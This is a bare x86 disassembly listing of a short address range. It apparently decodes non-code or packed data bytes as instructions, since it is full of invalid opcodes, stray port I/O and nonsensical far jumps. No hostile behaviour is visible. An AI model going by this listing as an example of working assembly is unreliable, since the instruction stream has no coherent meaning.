  44f709:	in     eax,0x37
  44f70b:	sti    
  44f70c:	mov    ecx,ebp
  44f70e:	mov    dh,0x3e
  44f710:	mov    ecx,ebp
  44f712:	mov    edx,0xde9dff3d
  44f717:	sahf   
  44f718:	inc    esp
  44f719:	nop
  44f71a:	gs retf 
  44f71c:	int3   
  44f71d:	push   esp
  44f71e:	neg    dl
  44f720:	int3   
  44f721:	dec    esp
  44f722:	neg    dl
  44f724:	int3   
  44f725:	inc    esp
  44f726:	neg    dl
  44f728:	int3   
  44f729:	add    BYTE PTR [eax],al
  44f72b:	add    BYTE PTR [eax],al
  44f72d:	add    ch,ah
  44f72f:	aaa    
  44f730:	sti    
  44f731:	xor    DWORD PTR [edx+edi*4],0x74
  44f735:	add    BYTE PTR [edx-0x6c23894e],ch
  44f73b:	jb     0x44f74b
  44f73d:	inc    DWORD PTR [ebp-0x6fbb6116]
  44f743:	cmp    DWORD PTR [edx-0x8],edx
  44f746:	test   al,0x1a
  44f748:	or     al,0x40
  44f74a:	nop
  44f74b:	aaa    
  44f74c:	push   edx
  44f74d:	clc    
  44f74e:	pusha  
  44f74f:	sbb    ah,BYTE PTR [ebp-0x73fcf801]
  44f755:	les    ecx,FWORD PTR [eax+0xbfc5239]
  44f75b:	jne    0x44f75b
  44f75d:	push   eax
  44f75e:	sbb    ebx,DWORD PTR [ebp+0x1a]
  44f761:	push   edx
  44f762:	sbb    ebp,DWORD PTR [ebp+0x16]
  44f765:	push   eax
  44f766:	fistp  WORD PTR [edx+ebp*8-0x75]
  44f76a:	in     eax,dx
  44f76b:	fs retf 
  44f76d:	int3   
  44f76e:	gs aaa 
  44f770:	sti    
  44f771:	push   ecx
  44f772:	iret   
  44f773:	ins    BYTE PTR es:[edi],dx
  44f774:	jmp    0x89eb:0xeb29000
  44f77b:	aaa    
  44f77c:	push   edx
  44f77d:	cld    
  44f77e:	adc    esi,edx
  44f780:	or     eax,0x94064d89
  44f785:	dec    ebp
  44f786:	pushf  
  44f787:	(bad)  
  44f788:	pop    ecx
  44f789:	adc    BYTE PTR [ebx],ah
  44f78b:	mov    ds:0xb5985593,eax
  44f790:	inc    ecx
  44f791:	cld    
  44f792:	add    BYTE PTR [eax],al
  44f794:	add    BYTE PTR [eax],al
  44f796:	add    BYTE PTR [edi-0x3274f2b8],dl
  44f79c:	scas   al,BYTE PTR es:[edi]
  44f79d:	or     ecx,DWORD PTR [ebp+0x74]
  44f7a0:	mov    dl,0xa0
  44f7a2:	adc    DWORD PTR [ebx+0x280762f4],ebp
  44f7a8:	mov    ah,0xe
  44f7aa:	add    BYTE PTR [eax+0x40eb130d],dl
  44f7b0:	(bad)  
  44f7b1:	into   
  44f7b2:	mov    esi,DWORD PTR ds:0x54cccb60
  44f7b8:	out    dx,eax
  44f7b9:	fcmove st,st(4)
  44f7bb:	dec    esp
  44f7bc:	out    dx,eax
  44f7bd:	fcmove st,st(4)
  44f7bf:	inc    esp
  44f7c0:	out    dx,eax
  44f7c1:	fcmove st,st(4)
  44f7c3:	lds    ebp,FWORD PTR ds:0xb288b9fb
  44f7c9:	push   cs
  44f7ca:	add    BYTE PTR [ebp+ebp*1-0x317a76ea],dh
  44f7d1:	popf   
  44f7d2:	inc    esp
  44f7d3:	nop
  44f7d4:	pop    edi
  44f7d5:	retf   
  44f7d6:	int3   
  44f7d7:	aam    0xee
  44f7d9:	fcmove st,st(4)
  44f7db:	int3   
  44f7dc:	out    dx,al
  44f7dd:	fcmove st,st(4)
  44f7df:	(bad)  
  44f7e0:	out    dx,al
  44f7e1:	fcmove st,st(4)
  44f7e3:	inc    ebp
  44f7e4:	sub    eax,0xa2f483fb
  44f7e9:	xchg   ebx,eax
  44f7ea:	inc    ebp
  44f7eb:	mov    BYTE PTR ds:0xb1900467,dh
  44f7f1:	xchg   edx,eax
  44f7f2:	mov    BYTE PTR [eax+0x558b0eb2],dl
  44f7f8:	stos   BYTE PTR es:[edi],al
  44f7f9:	xchg   ebx,eax
  44f7fa:	push   ecx
  44f7fb:	add    BYTE PTR [eax],al
  44f7fd:	add    BYTE PTR [eax],al
  44f7ff:	add    BYTE PTR [ebp+esi*1+0xce108f5],dl
  44f806:	xchg   esi,eax
  44f807:	push   ebp
  44f808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f809:	sub    eax,0xf3130852
  44f80e:	push   ss
  44f80f:	mov    DWORD PTR [ebp+0x2],edx
  44f812:	rol    BYTE PTR [ebp-0x6c],1
  44f815:	mov    dl,0xe
  44f817:	add    BYTE PTR [eax-0x2a74e9f3],dl
  44f81d:	dec    BYTE PTR [ebx+0x5a2b91c1]
  44f823:	cld    
  44f824:	or     esp,DWORD PTR [edi-0x16]
  44f827:	cmp    eax,ebp
  44f829:	push   es
  44f82a:	pop    esp
  44f82b:	inc    esi
  44f82c:	sbb    esi,DWORD PTR [edi-0x16]
  44f82f:	mov    ecx,ebp
  44f831:	add    bl,BYTE PTR [eax]
  44f833:	mov    bh,0x7c
  44f835:	jae    0x44f804
  44f837:	cli    
  44f838:	pushf  
  44f839:	xor    eax,0xc4bd03e5
  44f83e:	xchg   ebx,eax
  44f83f:	inc    ebp
  44f840:	cmp    al,0x2d
  44f842:	pop    edx
  44f843:	lock xchg DWORD PTR [ecx+0x3],ecx
  44f847:	inc    ecx
  44f848:	adc    DWORD PTR [eax+ebp*8],edx
  44f84b:	seto   BYTE PTR [edx+0x2d185595]
  44f852:	push   edx
  44f853:	or     BYTE PTR [ebx],cl
  44f855:	outs   dx,DWORD PTR ds:[esi]
  44f856:	sbb    al,BYTE PTR [ebx]
  44f858:	cwde   
  44f859:	sub    eax,0xb61bf842
  44f85e:	std    
  44f85f:	add    dl,BYTE PTR [ebp-0x5e]
  44f862:	xchg   ebx,eax
  44f863:	dec    ebp
  44f864:	add    BYTE PTR [eax],al
  44f866:	add    BYTE PTR [eax],al
  44f868:	add    BYTE PTR [eax-0x6cf3bdd3],cl
  44f86e:	mov    ds:0x2ae84d93,eax
  44f873:	adc    ecx,DWORD PTR [edx]
  44f875:	jmp    0x44f8c1
  44f877:	xchg   esp,eax
  44f878:	push   ebp
  44f879:	mov    BYTE PTR ds:0x74930852,ch
  44f87f:	adc    cl,BYTE PTR [ecx+0x6bf5aa4d]
  44f885:	mov    edi,0xad8be800
  44f88a:	pop    esi
  44f88b:	retf   
  44f88c:	int3   
  44f88d:	inc    ebp
  44f88e:	sub    eax,0xd5b483fb
  44f893:	xchg   ebx,eax
  44f894:	inc    ebp
  44f895:	mov    BYTE PTR [ebx],ch
  44f897:	push   edx
  44f898:	in     al,0xb
  44f89a:	outs   dx,DWORD PTR ds:[esi]
  44f89b:	repnz mov esp,ebp
  44f89e:	push   ss
  44f89f:	or     al,0x51
  44f8a1:	les    ebp,FWORD PTR [ecx]
  44f8a3:	inc    edx
  44f8a4:	call   0x8c3b6eb4
  44f8a9:	or     BYTE PTR [ebx],dh
  44f8ab:	lldt   WORD PTR [eax+0x13f05a29]
  44f8b2:	jle    0x44f892
  44f8b4:	add    BYTE PTR [edi-0x6fff1bca],cl
  44f8ba:	mov    dl,0x93
  44f8bc:	push   ebp
  44f8bd:	cwde   
  44f8be:	mov    bl,0x41
  44f8c0:	lock sbb DWORD PTR [esi-0x12],esp
  44f8c4:	mov    edx,ebp
  44f8c6:	adc    cl,BYTE PTR [eax+edi*2-0x7be84d60]
  44f8cd:	add    BYTE PTR [eax],al
  44f8cf:	add    BYTE PTR [eax],al
  44f8d1:	add    BYTE PTR ds:0xba000eb3,dh
  44f8d7:	mov    dl,0x74
  44f8d9:	add    BYTE PTR [ebx],cl
  44f8db:	outs   dx,BYTE PTR ds:[esi]
  44f8dc:	out    dx,al
  44f8dd:	mov    edi,DWORD PTR [ebp-0x63aef456]
  44f8e3:	fs out 0x15,eax
  44f8e6:	call   0x9454c2d
  44f8eb:	jbe    0x44f8d7
  44f8ed:	mov    ecx,DWORD PTR [ebp+0x12]
  44f8f0:	mov    WORD PTR [eax],?
  44f8f2:	nop
  44f8f3:	xchg   BYTE PTR ds:0x9412558b,al
  44f8f9:	push   ebp
  44f8fa:	mov    BYTE PTR [ebx+0x63d88fd],dh
  44f900:	xchg   esp,eax
  44f901:	inc    ebp
  44f902:	mov    al,0x2b
  44f904:	pop    edx
  44f905:	or     BYTE PTR [ebx+0x4d88fe6a],dl
  44f90b:	push   cs
  44f90c:	hlt    
  44f90d:	pop    ss
  44f90e:	or     esp,DWORD PTR [esi-0x12]
  44f911:	mov    edx,DWORD PTR [ebp-0x56]
  44f914:	or     eax,DWORD PTR [edx-0x80]
  44f917:	sub    DWORD PTR [edx-0xc],edx
  44f91a:	or     ebp,DWORD PTR [esi-0x12]
  44f91d:	mov    edi,DWORD PTR ds:0x19110baa
  44f923:	gs cli 
  44f925:	(bad)  
  44f926:	int    0xfa
  44f928:	push   cs
  44f929:	add    BYTE PTR [eax+0x704593b2],dl
  44f92f:	xor    esp,DWORD PTR [edi+0x10]
  44f932:	nop
  44f933:	xchg   BYTE PTR [edi],dl
  44f935:	mov    eax,DWORD PTR [eax]
  44f937:	add    BYTE PTR [eax],al
  44f939:	add    BYTE PTR [eax],al
  44f93b:	aad    0x12
  44f93d:	mov    WORD PTR [ecx],?
  44f93f:	nop
  44f940:	xchg   BYTE PTR [edi],cl
  44f942:	(bad)  
  44f943:	int    0xfa
  44f945:	or     eax,0x93b29000
  44f94a:	push   ebp
  44f94b:	cmp    al,0x33
  44f94d:	and    eax,0x9391c400
  44f952:	inc    ebp
  44f953:	cmp    al,0x2b
  44f955:	pop    ss
  44f956:	xor    DWORD PTR [ecx],0x10000eb2
  44f95c:	xchg   BYTE PTR [edx],cl
  44f95e:	mov    eax,ebp
  44f960:	push   es
  44f961:	xchg   esp,eax
  44f962:	add    ch,BYTE PTR [ebp-0x1]
  44f965:	out    0xff,eax
  44f967:	(bad)  
  44f968:	bound  edx,QWORD PTR [ebx-0x99efbb3]
  44f96e:	mov    ch,0xfd
  44f970:	(bad)  
  44f971:	out    0x83,eax
  44f973:	int3   
  44f974:	test   eax,0xacc4595
  44f979:	or     ecx,DWORD PTR [ebx+0x294063d]
  44f97f:	or     ebp,DWORD PTR [ebp+0x16]
  44f982:	lea    edi,[edx+ebp*4]
  44f985:	or     al,0x52
  44f987:	sbb    esi,DWORD PTR [ebp-0x16]
  44f98a:	push   eax
  44f98b:	mov    eax,0xbfffea26
  44f990:	xor    dl,bl
  44f992:	or     BYTE PTR [ecx],cl
  44f994:	jne    0x44f960
  44f996:	mov    ebx,DWORD PTR [ebp+0xe]
  44f999:	xchg   esp,eax
  44f99a:	push   ebp
  44f99b:	les    ebp,FWORD PTR [eax]
  44f99d:	dec    BYTE PTR [edx+0x0]
  44f9a3:	add    BYTE PTR [ebp+0x6],dl
  44f9a6:	mov    eax,es
  44f9a8:	mov    WORD PTR [ecx],gs
  44f9aa:	push   edx
  44f9ab:	hlt    
  44f9ac:	sbb    esi,DWORD PTR [eax-0x6]
  44f9af:	adc    DWORD PTR [ecx-0x49],0xffffff95
  44f9b3:	dec    ebp
  44f9b4:	ins    BYTE PTR es:[edi],dx
  44f9b5:	or     al,BYTE PTR [eax-0x73ed2275]
  44f9bb:	ret    0x2b84
  44f9be:	inc    edx
  44f9bf:	loopne 0x44fa3a
  44f9c1:	lods   eax,DWORD PTR ds:[esi]
  44f9c2:	out    0xff,eax
  44f9c4:	pop    edi
  44f9c5:	sub    dh,dl
  44f9c7:	pop    ebp
  44f9c8:	push   ebx
  44f9c9:	out    dx,eax
  44f9ca:	fcmove st,st(4)
  44f9cc:	in     eax,0x29
  44f9ce:	sti    
  44f9cf:	xor    DWORD PTR [ebx+ebp*4],0x76
  44f9d3:	lock xchg ebx,eax
  44f9d5:	jb     0x44f9e5
  44f9d7:	call   FWORD PTR [ebp-0x6fbb60ee]
  44f9dd:	sub    edx,DWORD PTR [edx-0x8]
  44f9e0:	mov    eax,0x90400bfe
  44f9e5:	sub    DWORD PTR [edx-0x8],edx
  44f9e8:	ror    BYTE PTR [edx],0x29
  44f9eb:	std    
  44f9ec:	paddd  mm1,QWORD PTR [ebx+0x522b98c4]
  44f9f3:	cld    
  44f9f4:	or     esi,DWORD PTR [eax-0x2]
  44f9f7:	push   eax
  44f9f8:	or     ebp,DWORD PTR [eax+0x1a]
  44f9fb:	push   edx
  44f9fc:	sbb    edi,DWORD PTR [eax+0x16]
  44f9ff:	push   eax
  44fa00:	out    0x67,eax
  44fa02:	jmp    0xcc:0xcb5ff58b
  44fa09:	add    BYTE PTR [eax],al
  44fa0b:	add    BYTE PTR [eax],al
  44fa0d:	(bad)  
  44fa0e:	out    dx,al
  44fa0f:	fcmove st,st(4)
  44fa11:	gs sub ebx,edi
  44fa14:	mov    eax,ds:0x534388
  44fa19:	(bad)  
  44fa1a:	mov    dl,0x76
  44fa1c:	mov    ebx,DWORD PTR [ebp-0x6fbb623e]
  44fa22:	sub    edi,DWORD PTR [edi]
  44fa24:	add    edx,esp
  44fa26:	icebp  
  44fa27:	xchg   esi,eax
  44fa28:	push   eax
  44fa29:	xchg   ebp,eax
  44fa2a:	pop    edi
  44fa2b:	retf   
  44fa2c:	int3   
  44fa2d:	(bad)  
  44fa2e:	out    dx,al
  44fa2f:	fcmove st,st(4)
  44fa31:	in     eax,0x29
  44fa33:	sti    
  44fa34:	xor    DWORD PTR [esi+ebp*4-0x53],0x2c
  44fa39:	inc    ecx
  44fa3a:	jbe    0x44fa4a
  44fa3c:	mov    esp,DWORD PTR [edx-0x3f]
  44fa3f:	aad    0x3e
  44fa41:	sbb    esi,DWORD PTR [edx+0x1e]
  44fa44:	mov    eax,DWORD PTR [edx+0x29]
  44fa47:	mov    ebp,0x1a6a0b3e
  44fa4c:	mov    eax,DWORD PTR [edx+0x2b]
  44fa4f:	pop    edx
  44fa50:	hlt    
  44fa51:	sbb    esi,DWORD PTR [edi-0x1e]
  44fa54:	mov    ebx,eax
  44fa56:	scas   al,BYTE PTR es:[edi]
  44fa57:	xchg   ebp,eax
  44fa58:	dec    ebp
  44fa59:	cmp    BYTE PTR [ecx],ch
  44fa5b:	inc    edx
  44fa5c:	clc    
  44fa5d:	or     DWORD PTR [edi-0x16],esp
  44fa60:	mov    eax,0xeb291
  44fa65:	or     eax,0x134462f2
  44fa6a:	jg     0x44fa52
  44fa6c:	add    BYTE PTR [ebp+0xc01bb6],bl
  44fa72:	add    BYTE PTR [eax],al
  44fa74:	add    BYTE PTR [eax],al
  44fa76:	sti    
  44fa77:	mov    ebp,0x29084d93
  44fa7c:	sbb    BYTE PTR ds:[ebx-0x668ae999],bh
  44fa83:	sub    DWORD PTR [edx-0x8],edx
  44fa86:	sbb    ebp,DWORD PTR [edi+0x1a]
  44fa89:	mov    DWORD PTR [eax-0x62],ebx
  44fa8c:	xchg   ebx,eax
  44fa8d:	push   ebp
  44fa8e:	fsubr  DWORD PTR [eax]
  44fa90:	push   edx
  44fa91:	adc    BYTE PTR [ecx],cl
  44fa93:	jo     0x44fa9b
  44fa95:	mov    eax,0xeb291
  44fa9a:	mov    ebx,0xb84d9399
  44fa9f:	sub    dh,bh
  44faa1:	mov    BYTE PTR [ebp-0x6],bl
  44faa4:	xchg   ebx,eax
  44faa5:	inc    ebp
  44faa6:	test   al,0xb8
  44faa8:	push   ecx
  44faa9:	cld    
  44faaa:	sbb    eax,0xabc01bb6
  44faaf:	mov    ch,0xf3
  44fab1:	mov    bl,0x63
  44fab3:	repnz xchg ebx,eax
  44fab5:	in     eax,0xed
  44fab7:	out    dx,eax
  44fab8:	fcmove st,st(4)
  44faba:	push   esp
  44fabb:	out    dx,eax
  44fabc:	fcmove st,st(4)
  44fabe:	dec    esp
  44fabf:	out    dx,eax
  44fac0:	fcmove st,st(4)
  44fac2:	inc    esp
  44fac3:	out    dx,eax
  44fac4:	fcmove st,st(4)
  44fac6:	lds    esp,FWORD PTR [edi]
  44fac8:	sti    
  44fac9:	mov    ecx,ebp
  44facb:	stos   BYTE PTR es:[edi],al
  44facc:	and    eax,DWORD PTR [ebp-0x74]
  44facf:	jg     0x44fae0
  44fad1:	mov    ecx,ebp
  44fad3:	stos   BYTE PTR es:[edi],al
  44fad4:	repz add eax,0x4593b03b
  44fada:	add    BYTE PTR [eax],al
  44fadc:	add    BYTE PTR [eax],al
  44fade:	add    BYTE PTR [ebp+ebx*2-0x10b33335],dl
  44fae5:	fcmove st,st(4)
  44fae7:	inc    esp
  44fae8:	out    dx,eax
  44fae9:	fcmove st,st(4)
  44faeb:	lds    esp,FWORD PTR [edi]
  44faed:	sti    
  44faee:	xor    DWORD PTR [edi+ecx*8],0xffffffcf
  44faf2:	inc    ebp
  44faf3:	sbb    al,0xb3
  44faf5:	mov    esi,0x52279004
  44fafa:	or     BYTE PTR [ecx],bl
  44fafc:	jbe    0x44fac4
  44fafe:	mov    edx,DWORD PTR [ebp-0x26]
  44fb01:	xchg   ebx,eax
  44fb02:	push   ebp
  44fb03:	mov    BYTE PTR [edi+0x66093c3d],ch
  44fb09:	out    dx,al
  44fb0a:	mov    edx,DWORD PTR [ebp+0x12]
  44fb0d:	sbb    BYTE PTR [edi+0x5593a658],dh
  44fb13:	lock sub eax,0x29780a53
  44fb19:	push   edx
  44fb1a:	call   0x4057b157
  44fb1f:	nop
  44fb20:	daa    
  44fb21:	sbb    bl,BYTE PTR [eax]
  44fb23:	add    DWORD PTR [edi+0xe],esi
  44fb26:	push   ecx
  44fb27:	test   al,0xab
  44fb29:	jmp    0x1908:0xd32fafff
  44fb30:	jbe    0x44fb10
  44fb32:	push   0x50
  44fb34:	mov    cl,BYTE PTR [esi]
  44fb36:	xor    BYTE PTR [eax+0x600076b2],dl
  44fb3c:	mov    dh,0xe
  44fb3e:	push   0xffffff90
  44fb40:	sti    
  44fb41:	inc    ecx
  44fb42:	lock add BYTE PTR [eax],al
  44fb45:	add    BYTE PTR [eax],al
  44fb47:	add    BYTE PTR [ecx],cl
  44fb49:	jne    0x44fb3d
  44fb4b:	mov    ebx,ebp
  44fb4d:	adc    dl,BYTE PTR [edx+eax*2+0x4d9362c4]
  44fb54:	cwde   
  44fb55:	popa   
  44fb56:	xchg   ebx,eax
  44fb57:	push   ebp
  44fb58:	je     0x44fbba
  44fb5a:	test   BYTE PTR [ecx-0x7c1804aa],0x54
  44fb61:	scas   al,BYTE PTR es:[edi]
  44fb62:	iret   
  44fb63:	inc    ebp
  44fb64:	cmp    al,0xb2
  44fb66:	push   cs
  44fb67:	add    BYTE PTR [eax-0x3274e9f9],dl
  44fb6d:	push   es
  44fb6e:	mov    eax,es
  44fb70:	xchg   ecx,eax
  44fb71:	sub    DWORD PTR [edx-0xc],edx
  44fb74:	sbb    ebp,DWORD PTR [ebp-0x12]
  44fb77:	movntq QWORD PTR [eax+0x10],mm4
  44fb7b:	cmp    DWORD PTR [ebp+0x1b595c06],edi
  44fb81:	jne    0x44fb79
  44fb83:	or     DWORD PTR [eax+0x55740ea6],0x27
  44fb8a:	pop    edx
  44fb8b:	call   0x4374a3
  44fb90:	fs mov esi,0x26f85593
  44fb96:	dec    ebp
  44fb97:	adc    BYTE PTR [ebx],cl
  44fb99:	ins    DWORD PTR es:[edi],dx
  44fb9a:	out    dx,al
  44fb9b:	mov    eax,DWORD PTR [ecx-0x42]
  44fb9e:	cdq    
  44fb9f:	inc    esp
  44fba0:	mov    al,ds:0xb04d93fb
  44fba5:	mov    esi,0xbe41f7bc
  44fbaa:	xchg   ebx,eax
  44fbab:	push   ebp
  44fbac:	add    BYTE PTR [eax],al
  44fbae:	add    BYTE PTR [eax],al
  44fbb0:	add    BYTE PTR [eax+0x6c42b7aa],dh
  44fbb6:	bound  edx,QWORD PTR [ebx+0x5a26b845]
  44fbbc:	or     BYTE PTR [ebx+0xb51026a],dl
  44fbc2:	test   BYTE PTR gs:[ebx+0x420c0ed5],0x94
  44fbca:	(bad)  
  44fbcb:	not    BYTE PTR ds:0x83e7fa7e
  44fbd1:	dec    esp
  44fbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44fbd3:	xchg   ebx,eax
  44fbd4:	dec    ebp
  44fbd5:	js     0x44fc0d
  44fbd7:	into   
  44fbd8:	sub    BYTE PTR [ecx],bl
  44fbda:	push   0x2e02ebf6
  44fbdf:	inc    edx
  44fbe0:	in     al,0xc2
  44fbe2:	or     bl,cl
  44fbe4:	cld    
  44fbe5:	dec    edi
  44fbe6:	cli    
  44fbe7:	mov    eax,esp
  44fbe9:	mov    WORD PTR [edx-0x4d2ffbfe],cs
  44fbef:	lods   eax,DWORD PTR ds:[esi]
  44fbf0:	sbb    BYTE PTR [ecx],al
  44fbf2:	outs   dx,DWORD PTR ds:[esi]
  44fbf3:	push   cs
  44fbf4:	push   eax
  44fbf5:	cmp    BYTE PTR [esi-0x1d],ch
  44fbf8:	jmp    DWORD PTR [edi]
  44fbfa:	ror    DWORD PTR ss:[eax],cl
  44fbfd:	or     DWORD PTR [eax-0x36],esi
  44fc00:	adc    DWORD PTR [ebp-0x62],0xffffff9d
  44fc04:	inc    esp
  44fc05:	nop
  44fc06:	mov    dl,0x61
  44fc08:	or     bl,BYTE PTR [ebx]
  44fc0a:	test   al,0x1a
  44fc0c:	mov    cl,0x54
  44fc0e:	mov    dl,0x3d
  44fc10:	call   FWORD PTR [ebp-0x2a]
  44fc13:	mov    edi,DWORD PTR ds:0x0
  44fc19:	add    BYTE PTR [ebx+eax*2+0x7f900053],al
  44fc20:	or     ch,BYTE PTR [edx+0x50]
  44fc23:	mov    cl,BYTE PTR [esi]
  44fc25:	xor    BYTE PTR [eax-0x33aa6c4e],dl
  44fc2b:	fs xchg ebx,eax
  44fc2d:	inc    ebp
  44fc2e:	mov    al,0x2d
  44fc30:	push   edi
  44fc31:	xor    al,0x61
  44fc33:	stc    
  44fc34:	inc    ecx
  44fc35:	lock repz (bad) 
  44fc38:	sahf   
  44fc39:	inc    esp
  44fc3a:	nop
  44fc3b:	or     eax,0x8a506a02
  44fc40:	push   cs
  44fc41:	xor    BYTE PTR [eax-0x6baa6c4e],dl
  44fc47:	fs je  0x44fc4a
  44fc4a:	(bad)  
  44fc4b:	pop    edi
  44fc4c:	fisub  WORD PTR [ebx+0x53427c]
  44fc52:	adc    esi,DWORD PTR [edi-0x4d334f1e]
  44fc58:	push   cs
  44fc59:	jne    0x44fbe0
  44fc5b:	mov    WORD PTR [esi+0x68],cs
  44fc5e:	nop
  44fc5f:	ret    0xe
  44fc62:	or     ebp,DWORD PTR [edi-0x16]
  44fc65:	push   eax
  44fc66:	jmp    0xe355:0x4055e7b2
  44fc6d:	mov    al,0xcc
  44fc6f:	mov    dl,0x93
  44fc71:	dec    ebp
  44fc72:	xor    al,0x2b
  44fc74:	pop    edx
  44fc75:	fmul   DWORD PTR [ebx]
  44fc77:	pop    edi
  44fc78:	(bad)  
  44fc79:	mov    edx,ebp
  44fc7b:	fimul  DWORD PTR [ebx]
  44fc7d:	inc    edx
  44fc7e:	add    BYTE PTR [eax],al
  44fc80:	add    BYTE PTR [eax],al
  44fc82:	add    BYTE PTR [ebx+ebp*1+0x52],ah
  44fc86:	loopne 0x44fc93
  44fc88:	addr16 out dx,al
  44fc8a:	mov    eax,ecx
  44fc8c:	bound  edi,QWORD PTR [ebx+ecx*4]
  44fc8f:	push   ebp
  44fc90:	push   cs
  44fc91:	aas    
  44fc92:	mov    edx,DWORD PTR [ebp-0x6fbb6102]
  44fc98:	arpl   si,si
  44fc9a:	push   ecx
  44fc9b:	cmc    
  44fc9c:	clc    
  44fc9d:	out    0x83,eax
  44fc9f:	aam    0xa5
  44fca1:	xchg   ebx,eax
  44fca2:	push   ebp
  44fca3:	lock xor al,0xa5
  44fca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44fca7:	nop
  44fca8:	mov    dl,0xe
  44fcaa:	add    BYTE PTR [ebx+edi*4-0x6d],bl
  44fcae:	inc    ebp
  44fcaf:	mov    al,0x2c
  44fcb1:	pop    edx
  44fcb2:	fcom   DWORD PTR [ebx-0x6fff50d6]
  44fcb8:	mov    dl,0x95
  44fcba:	dec    ebp
  44fcbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44fcbc:	sub    al,0x42
  44fcbe:	loopne 0x44fcb1
  44fcc0:	std    
  44fcc1:	sahf   
  44fcc2:	inc    esp
  44fcc3:	nop
  44fcc4:	int    0x4c
  44fcc6:	xor    al,0xf3
  44fcc8:	rcr    DWORD PTR [ebp+0x1a2d9044],1
  44fcce:	and    BYTE PTR [ecx+0x6f],al
  44fcd1:	push   cs
  44fcd2:	push   ecx
  44fcd3:	sbb    ebx,DWORD PTR [esi-0x4d2b4f1e]
  44fcd9:	cmp    al,0x8b
  44fcdb:	int    0x6
  44fcdd:	aas    
  44fcde:	call   0x2cf88f
  44fce3:	adc    ebp,edi
  44fce5:	sbb    cl,BYTE PTR [ebx+0x0]
  44fceb:	add    ch,cl
  44fced:	adc    dl,BYTE PTR [ebp+edx*1+0x53435c]
  44fcf4:	xchg   ebx,eax
  44fcf5:	popa   
  44fcf6:	mov    DWORD PTR ss:[ebp-0x6fbb623e],ebx
  44fcfd:	xor    ebp,DWORD PTR [edx]
  44fcff:	adc    al,0x1
  44fd01:	outs   dx,DWORD PTR ds:[esi]
  44fd02:	push   cs
  44fd03:	add    BYTE PTR [ebp-0x1f0b523a],ah
  44fd09:	outs   dx,BYTE PTR ds:[esi]
  44fd0a:	push   cs
  44fd0b:	push   eax
  44fd0c:	or     esp,DWORD PTR [esi-0x4d334ee2]
  44fd12:	cmp    eax,0x9da6a58b
  44fd17:	inc    esp
  44fd18:	nop
  44fd19:	div    BYTE PTR fs:0x83e7f7fd
  44fd20:	int3   
  44fd21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44fd22:	lods   eax,DWORD PTR ds:[esi]
  44fd23:	hlt    
  44fd24:	and    BYTE PTR [edi+0xe],ch
  44fd27:	push   eax
  44fd28:	clc    
  44fd29:	scas   eax,DWORD PTR es:[edi]
  44fd2a:	in     al,0xff
  44fd2c:	fbstp  TBYTE PTR [ebx]
  44fd2e:	rol    DWORD PTR [ebx+ebp*8],cl
  44fd31:	xchg   edx,eax
  44fd32:	jbe    0x44fd58
  44fd34:	xchg   esp,eax
  44fd35:	jb     0x44fd45
  44fd37:	mov    edx,DWORD PTR [ebp-0x6fbb6266]
  44fd3d:	popa   
  44fd3e:	not    BYTE PTR [ecx]
  44fd40:	mov    edx,0xd483e7f7
  44fd45:	stos   BYTE PTR es:[edi],al
  44fd46:	xchg   ebp,eax
  44fd47:	inc    ebp
  44fd48:	mov    esp,0xe0f4022b
  44fd4d:	outs   dx,BYTE PTR ds:[esi]
  44fd4e:	push   cs
  44fd4f:	push   edx
  44fd50:	add    BYTE PTR [eax],al
  44fd52:	add    BYTE PTR [eax],al
  44fd54:	add    BYTE PTR [ebx],cl
  44fd56:	outs   dx,BYTE PTR ds:[esi]
  44fd57:	out    dx,al
  44fd58:	mov    ebx,DWORD PTR [ebp-0x6fbb6102]
  44fd5e:	mov    bl,0x56
  44fd60:	sub    cl,ah
  44fd62:	sub    eax,DWORD PTR [edx]
  44fd64:	or     al,0x41
  44fd66:	outs   dx,BYTE PTR ds:[esi]
  44fd67:	push   cs
  44fd68:	push   edx
  44fd69:	js     0x44fd76
  44fd6b:	jmp    0x44fd6c
  44fd6d:	addr16 xor edx,ebx
  44fd70:	or     al,0x31
  44fd72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44fd73:	popf   
  44fd74:	inc    esp
  44fd75:	nop
  44fd76:	lods   eax,DWORD PTR ds:[esi]
  44fd77:	scas   al,BYTE PTR es:[edi]
  44fd78:	scas   al,BYTE PTR es:[edi]
  44fd79:	xchg   esp,eax
  44fd7a:	mov    dl,0xab
  44fd7c:	cmp    BYTE PTR [ecx],al
  44fd7e:	outs   dx,BYTE PTR ds:[esi]
  44fd7f:	push   cs
  44fd80:	(bad)  
  44fd81:	int    0xfa
  44fd83:	cmp    eax,0x108cd06a
  44fd88:	mov    eax,DWORD PTR [ebp-0x6fbb6246]
  44fd8e:	fs out 0x55,eax
  44fd91:	inc    esp
  44fd92:	or     ch,BYTE PTR [ebp-0x5908e804]
  44fd98:	add    DWORD PTR [eax-0x1274f14e],edx
  44fd9e:	push   esp
  44fd9f:	int3   
  44fda0:	add    al,0x90
  44fda2:	out    0xda,al
  44fda4:	int3   
  44fda5:	(bad)  
  44fda6:	in     eax,0xda
  44fda8:	int3   
  44fda9:	inc    ebp
  44fdaa:	sub    edi,ebx
  44fdac:	mov    ecx,DWORD PTR [ebp-0x56]
  44fdaf:	xchg   ebx,eax
  44fdb0:	inc    eax
  44fdb1:	fcom   QWORD PTR [ebx+ecx*8-0x34]
  44fdb5:	(bad)  
  44fdb6:	in     eax,0xda
  44fdb8:	int3   
  44fdb9:	add    BYTE PTR [eax],al
  44fdbb:	add    BYTE PTR [eax],al
  44fdbd:	add    BYTE PTR [ebp+0x2b],ah
  44fdc0:	sti    
  44fdc1:	push   ebx
  44fdc2:	pop    esi
  44fdc3:	pop    edi
  44fdc4:	xchg   ebx,eax
  44fdc5:	cmp    eax,0x534190
  44fdca:	or     edx,DWORD PTR [ebp-0x4dab4eea]
  44fdd0:	xchg   ebx,eax
  44fdd1:	xor    eax,0x5341a8
  44fdd6:	aas    
  44fdd7:	pop    eax
  44fdd8:	inc    ebx
  44fdd9:	pop    ebp
  44fdda:	shl    ebp,cl
  44fddc:	fcmove st,st(4)
  44fdde:	in     eax,0x29
  44fde0:	sti    
  44fde1:	push   ecx
  44fde2:	clc    
  44fde3:	mov    esi,0x53904012
  44fde8:	pop    es
  44fde9:	mov    cl,0xcc
